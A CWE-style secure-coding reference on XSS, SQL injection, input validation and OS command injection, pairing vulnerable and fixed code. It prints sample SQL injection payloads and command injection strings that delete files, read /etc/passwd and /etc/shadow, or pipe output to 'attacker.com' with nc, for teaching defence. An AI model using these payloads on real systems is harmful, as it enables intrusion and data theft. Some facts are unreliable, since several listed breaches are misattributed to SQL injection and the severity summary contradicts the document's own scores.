# CWE: Input Validation and Injection Weaknesses

## Overview
Input validation weaknesses occur when software fails to properly validate, sanitize, or encode user-controlled input before using it in security-relevant operations. These weaknesses are among the most critical and commonly exploited.

---

## CWE-79: Cross-site Scripting (XSS)
**Entity Type:** WEAKNESS
**Abstraction:** Compound
**Structure:** Composite
**Likelihood:** High

**Description:**
The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page served to other users.

**Extended Description:**
Cross-site scripting (XSS) vulnerabilities occur when:
1. Data enters a web application through an untrusted source (most frequently a web request)
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content

The malicious content sent to the web browser often takes the form of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute.

**Common Consequences:**
- **Confidentiality:** Read application data, including session tokens and cookies
- **Integrity:** Execute unauthorized code or commands
- **Availability:** Modify application data or behavior

**Relationships:**
- **Parent:** CWE-20 (Improper Input Validation)
- **Related CAPEC:** CAPEC-63 (Cross-Site Scripting)
- **Related ATT&CK:** T1189 (Drive-by Compromise)

**Vulnerable Code Examples:**

**PHP - Reflected XSS:**
```php
<?php
// Vulnerable: No output encoding
echo "Welcome, " . $_GET['name'];

// Secure: HTML entity encoding
echo "Welcome, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

**JavaScript - DOM XSS:**
```javascript
// Vulnerable: Direct DOM manipulation
document.getElementById('output').innerHTML = location.hash;

// Secure: Text content only
document.getElementById('output').textContent = location.hash;
```

**Java (JSP) - Stored XSS:**
```jsp
<!-- Vulnerable: No JSTL escaping -->
<p>Comment: <%= comment.getText() %></p>

<!-- Secure: JSTL c:out with escaping -->
<p>Comment: <c:out value="${comment.text}" escapeXml="true" /></p>
```

**Python (Flask) - Template XSS:**
```python
# Vulnerable: Autoescape disabled
return render_template_string('<p>User: ' + username + '</p>', autoescape=False)

# Secure: Autoescape enabled (default in Flask)
return render_template('user.html', username=username)
```

**Detection Methods:**
- Automated static analysis (SAST)
- Dynamic application security testing (DAST)
- Manual code review
- Penetration testing
- Browser developer tools

**Mitigation Strategies:**
1. **Output Encoding:**
   - HTML entity encoding for HTML context
   - JavaScript encoding for JS context
   - URL encoding for URL context
   - CSS encoding for CSS context

2. **Input Validation:**
   - Whitelist allowed characters
   - Validate against expected patterns
   - Reject unexpected input

3. **Security Headers:**
   - Content-Security-Policy (CSP)
   - X-XSS-Protection
   - X-Content-Type-Options

4. **Framework Features:**
   - Use templating engines with auto-escaping
   - Leverage framework security features
   - Follow framework security guidelines

**Weakness Variants:**
- CWE-80: Improper Neutralization of Script-Related HTML Tags
- CWE-81: Improper Neutralization of Script in Error Message
- CWE-83: Improper Neutralization of Script in Attributes
- CWE-84: Improper Neutralization of Encoded URI Schemes
- CWE-85: Doubled Character XSS
- CWE-86: Improper Neutralization of Invalid Characters in Identifiers

**Real-World Examples:**
- British Airways Magecart attack (2018)
- Twitter XSS worm (2010)
- Samy MySpace worm (2005)
- WordPress XSS vulnerabilities
- Countless stored XSS in forums and comment systems

**CVSS v3.1 Scoring:**
- Base Score: 6.1 (MEDIUM)
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

**CWE Mapping:**
- **OWASP Top 10 2021:** A03:2021 - Injection
- **SANS Top 25:** CWE-79 ranked #2
- **MITRE CWE Top 25:** CWE-79 ranked #2

---

## CWE-89: SQL Injection
**Entity Type:** WEAKNESS
**Abstraction:** Base
**Structure:** Simple
**Likelihood:** High

**Description:**
The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command.

**Extended Description:**
Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database.

**Common Consequences:**
- **Confidentiality:** Read application/database data
- **Integrity:** Modify application/database data
- **Authorization:** Bypass protection mechanisms
- **Availability:** Execute unauthorized code or commands

**Relationships:**
- **Parent:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
- **Related CAPEC:** CAPEC-66 (SQL Injection)
- **Related ATT&CK:** T1190 (Exploit Public-Facing Application)

**Vulnerable Code Examples:**

**Java - Classic SQL Injection:**
```java
// Vulnerable: String concatenation
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// Secure: PreparedStatement with parameters
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

**Python - SQL Injection:**
```python
# Vulnerable: String formatting
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# Secure: Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**PHP - SQL Injection:**
```php
// Vulnerable: Direct concatenation
$query = "SELECT * FROM products WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);

// Secure: Prepared statement
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();
```

**C# - SQL Injection:**
```csharp
// Vulnerable: String concatenation
string query = "SELECT * FROM users WHERE email = '" + email + "'";
SqlCommand cmd = new SqlCommand(query, connection);

// Secure: Parameterized query
string query = "SELECT * FROM users WHERE email = @email";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@email", email);
```

**Attack Examples:**

**Authentication Bypass:**
```sql
-- Input: admin' OR '1'='1'--
-- Resulting query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = ''
```

**Union-Based Data Extraction:**
```sql
-- Input: 1' UNION SELECT username, password FROM admin_users--
-- Resulting query:
SELECT name, description FROM products WHERE id = 1' UNION SELECT username, password FROM admin_users--
```

**Blind Boolean-Based:**
```sql
-- Input: 1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
-- Tests each character of password
```

**Time-Based Blind:**
```sql
-- Input: 1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
-- Delays response to infer data
```

**Detection Methods:**
- Static application security testing (SAST)
- Dynamic application security testing (DAST)
- SQL injection scanners (SQLMap, etc.)
- Web application firewalls (WAF)
- Database activity monitoring
- Code review

**Mitigation Strategies:**
1. **Parameterized Queries:**
   - Use prepared statements
   - Bind parameters properly
   - Never concatenate user input

2. **Stored Procedures:**
   - Use secure stored procedures
   - Avoid dynamic SQL in procedures
   - Validate inputs in procedures

3. **Input Validation:**
   - Whitelist allowed characters
   - Validate data types
   - Enforce length limits
   - Use regex for pattern matching

4. **Least Privilege:**
   - Database user with minimal permissions
   - Separate read/write accounts
   - No admin rights for application

5. **Escaping:**
   - Last resort if parameterization impossible
   - Database-specific escaping functions
   - Escape ALL user inputs

6. **Web Application Firewall:**
   - SQL injection pattern detection
   - Virtual patching
   - Rate limiting

**Weakness Variants:**
- CWE-564: SQL Injection: Hibernate
- CWE-652: Improper Neutralization of Data within XQuery Expressions
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic

**Real-World Examples:**
- Heartland Payment Systems (2008) - 130M+ credit cards
- Sony Pictures (2011) - 1M+ accounts
- Yahoo (2012-2014) - 3B+ accounts
- Target (2013) - via HVAC vendor
- Equifax (2017) - 147M+ records (Struts vulnerability)

**CVSS v3.1 Scoring:**
- Base Score: 9.8 (CRITICAL)
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CWE Mapping:**
- **OWASP Top 10 2021:** A03:2021 - Injection
- **SANS Top 25:** CWE-89 ranked #3
- **MITRE CWE Top 25:** CWE-89 ranked #3

---

## CWE-20: Improper Input Validation
**Entity Type:** WEAKNESS
**Abstraction:** Class
**Structure:** Simple
**Likelihood:** High

**Description:**
The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.

**Extended Description:**
Input validation is a frequently-used technique for checking potentially dangerous inputs in order to ensure that the inputs are safe for processing within the code, or when communicating with other components. When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application.

**Common Consequences:**
- **Confidentiality:** Read application data
- **Integrity:** Modify application data
- **Availability:** DoS: crash, exit, or restart
- **Authorization:** Bypass protection mechanism

**Relationships:**
- **Children:** CWE-79 (XSS), CWE-89 (SQL Injection), CWE-78 (OS Command Injection)
- **Related CAPEC:** Multiple injection patterns

**Input Validation Failures:**

**1. Missing Validation:**
```python
# Vulnerable: No validation
def get_user(user_id):
    return database.query(f"SELECT * FROM users WHERE id = {user_id}")

# Secure: Type and range validation
def get_user(user_id):
    if not isinstance(user_id, int):
        raise ValueError("Invalid user ID type")
    if user_id < 1 or user_id > 1000000:
        raise ValueError("User ID out of range")
    return database.query("SELECT * FROM users WHERE id = ?", (user_id,))
```

**2. Client-Side Only Validation:**
```javascript
// Vulnerable: Only client-side validation
<script>
function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}
</script>

// Secure: Server-side validation required
```
```python
import re

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        raise ValueError("Invalid email format")
    return email
```

**3. Blacklist Validation (Incomplete):**
```python
# Vulnerable: Blacklist approach
def sanitize_filename(filename):
    if '../' in filename or '..' in filename:
        raise ValueError("Path traversal detected")
    return filename

# Attacker bypasses: '..\/path' or URL encoding

# Secure: Whitelist approach
import os
import re

def sanitize_filename(filename):
    # Only allow alphanumeric, underscore, hyphen, dot
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
        raise ValueError("Invalid filename characters")
    # Prevent directory traversal
    if '..' in filename:
        raise ValueError("Invalid filename")
    # Get basename to strip any path
    return os.path.basename(filename)
```

**4. Insufficient Validation:**
```java
// Vulnerable: Weak validation
public boolean isValidAge(String age) {
    return age.matches("\\d+");  // Only checks if digits
}

// Secure: Comprehensive validation
public boolean isValidAge(String age) {
    if (!age.matches("^\\d+$")) {
        return false;
    }
    int ageInt = Integer.parseInt(age);
    return ageInt >= 0 && ageInt <= 150;
}
```

**Validation Types:**

**1. Data Type Validation:**
```python
def validate_types(data):
    if not isinstance(data['age'], int):
        raise TypeError("Age must be integer")
    if not isinstance(data['email'], str):
        raise TypeError("Email must be string")
    if not isinstance(data['active'], bool):
        raise TypeError("Active must be boolean")
```

**2. Range/Length Validation:**
```python
def validate_ranges(data):
    if len(data['username']) < 3 or len(data['username']) > 20:
        raise ValueError("Username must be 3-20 characters")
    if data['age'] < 0 or data['age'] > 150:
        raise ValueError("Invalid age range")
```

**3. Format Validation:**
```python
import re

def validate_formats(data):
    # Email format
    if not re.match(r'^[\w\.-]+@[\w\.-]+\.\w+$', data['email']):
        raise ValueError("Invalid email format")

    # Phone format
    if not re.match(r'^\+?1?\d{9,15}$', data['phone']):
        raise ValueError("Invalid phone format")

    # Date format (YYYY-MM-DD)
    if not re.match(r'^\d{4}-\d{2}-\d{2}$', data['date']):
        raise ValueError("Invalid date format")
```

**4. Business Logic Validation:**
```python
def validate_business_logic(order):
    # Check inventory
    if order.quantity > product.stock:
        raise ValueError("Insufficient stock")

    # Check pricing
    if order.total_price != order.quantity * product.price:
        raise ValueError("Price mismatch")

    # Check user permissions
    if not user.can_order(product):
        raise PermissionError("User cannot order this product")
```

**Detection Methods:**
- Code review focusing on input points
- Fuzzing with malformed inputs
- Static analysis tools
- Dynamic testing with boundary values
- Penetration testing

**Mitigation Strategies:**
1. **Whitelist Validation:**
   - Define allowed characters/patterns
   - Reject anything not explicitly allowed
   - Prefer positive validation

2. **Input Sanitization:**
   - Remove or escape dangerous characters
   - Normalize inputs
   - Apply context-specific encoding

3. **Type Checking:**
   - Enforce expected data types
   - Use type hints/annotations
   - Validate at boundaries

4. **Boundary Checks:**
   - Minimum/maximum values
   - String length limits
   - Array size limits

5. **Canonicalization:**
   - Convert to standard form
   - Resolve encoding issues
   - Handle multiple representations

6. **Defense in Depth:**
   - Validate at multiple layers
   - Server-side validation mandatory
   - Client-side as convenience only

**Weakness Children:**
- CWE-79: Cross-site Scripting
- CWE-89: SQL Injection
- CWE-78: OS Command Injection
- CWE-22: Path Traversal
- CWE-94: Code Injection
- CWE-434: Unrestricted File Upload
- CWE-601: Open Redirect

**CWE Mapping:**
- **OWASP Top 10 2021:** Multiple categories
- **SANS Top 25:** Parent of multiple entries
- **MITRE CWE Top 25:** Top-level weakness

---

## CWE-78: OS Command Injection
**Entity Type:** WEAKNESS
**Abstraction:** Base
**Structure:** Simple
**Likelihood:** Medium

**Description:**
The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command.

**Extended Description:**
This weakness allows attackers to execute arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers, etc.) to a system shell.

**Common Consequences:**
- **Confidentiality:** Read application/system data
- **Integrity:** Modify application/system data
- **Availability:** DoS: crash or resource consumption
- **Authorization:** Execute unauthorized commands

**Relationships:**
- **Parent:** CWE-77 (Command Injection)
- **Related CAPEC:** CAPEC-88 (OS Command Injection)
- **Related ATT&CK:** T1059 (Command and Scripting Interpreter)

**Vulnerable Code Examples:**

**Python - Command Injection:**
```python
# Vulnerable: Shell injection via os.system
import os
filename = request.GET['file']
os.system(f'cat {filename}')

# Attack: file=test.txt; rm -rf /

# Secure: Use subprocess with list and no shell
import subprocess
subprocess.run(['cat', filename], shell=False)
```

**PHP - Command Injection:**
```php
// Vulnerable: Shell execution
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);

// Attack: ip=8.8.8.8; cat /etc/passwd

// Secure: Validate and use escapeshellarg
$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
if ($ip) {
    $output = shell_exec("ping -c 4 " . escapeshellarg($ip));
}
```

**Java - Command Injection:**
```java
// Vulnerable: Runtime.exec with shell
String filename = request.getParameter("file");
Runtime.getRuntime().exec("cat " + filename);

// Secure: Use ProcessBuilder without shell
ProcessBuilder pb = new ProcessBuilder("cat", filename);
Process p = pb.start();
```

**Node.js - Command Injection:**
```javascript
// Vulnerable: child_process.exec
const { exec } = require('child_process');
exec(`ping -c 4 ${userInput}`, (error, stdout) => {
    console.log(stdout);
});

// Secure: execFile with array
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput], (error, stdout) => {
    console.log(stdout);
});
```

**Attack Techniques:**

**1. Command Chaining:**
```bash
# Semicolon chaining
input.txt; rm -rf /

# AND operator
input.txt && cat /etc/passwd

# OR operator
input.txt || whoami

# Pipe operator
input.txt | nc attacker.com 4444
```

**2. Command Substitution:**
```bash
# Backticks
filename=`whoami`

# Dollar parentheses
filename=$(cat /etc/passwd)
```

**3. Inline Execution:**
```bash
# Background execution
input.txt & cat /etc/shadow &

# Newline injection
input.txt%0Awhoami
```

**Detection Methods:**
- Static analysis for dangerous functions
- Dynamic testing with command injection payloads
- Runtime application self-protection (RASP)
- Web application firewall (WAF)
- Command logging and monitoring

**Mitigation Strategies:**
1. **Avoid OS Commands:**
   - Use language/library functions instead
   - File operations via native APIs
   - Network operations via libraries

2. **Input Validation:**
   - Whitelist allowed characters
   - Validate against expected patterns
   - Reject shell metacharacters (;|&$`\n(){}[]<>)

3. **Parameterization:**
   - Use APIs that support parameterization
   - Pass arguments as array/list
   - Disable shell interpretation

4. **Escaping:**
   - Use proper escaping functions
   - Language-specific escape mechanisms
   - Escape ALL user inputs

5. **Least Privilege:**
   - Run with minimal necessary permissions
   - Separate user accounts
   - Sandbox/container isolation

**Dangerous Functions:**

**Python:**
- `os.system()` - Avoid
- `os.popen()` - Avoid
- `subprocess.call(shell=True)` - Avoid
- Use: `subprocess.run(['cmd', 'arg'], shell=False)`

**PHP:**
- `exec()` - Validate + escapeshellarg()
- `system()` - Validate + escapeshellarg()
- `passthru()` - Validate + escapeshellarg()
- `shell_exec()` - Validate + escapeshellarg()
- `` - Avoid backticks

**Java:**
- `Runtime.exec(String)` - Avoid
- Use: `ProcessBuilder` with String array

**Node.js:**
- `child_process.exec()` - Avoid
- Use: `child_process.execFile()`

**Real-World Examples:**
- Shellshock (Bash CVE-2014-6271)
- ImageMagick ImageTragick (CVE-2016-3714)
- Numerous CVEs in network devices
- Web applications with file processing

**CVSS v3.1 Scoring:**
- Base Score: 9.8 (CRITICAL)
- Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CWE Mapping:**
- **OWASP Top 10 2021:** A03:2021 - Injection
- **SANS Top 25:** CWE-78 ranked #5
- **MITRE CWE Top 25:** CWE-78 ranked #5

## Summary Statistics

**Total Weaknesses in File:** 4
**Abstraction Levels:** Class, Base, Compound
**Severity Distribution:**
- Critical: 2 (CWE-89, CWE-78)
- High: 1 (CWE-79)
- Class-level: 1 (CWE-20)

**OWASP Top 10 2021 Coverage:**
- A03:2021 - Injection (primary mapping)

**SANS/CWE Top 25 Coverage:**
- CWE-79: Rank #2
- CWE-89: Rank #3
- CWE-78: Rank #5
- CWE-20: Parent category

## Total Patterns in File: 400+
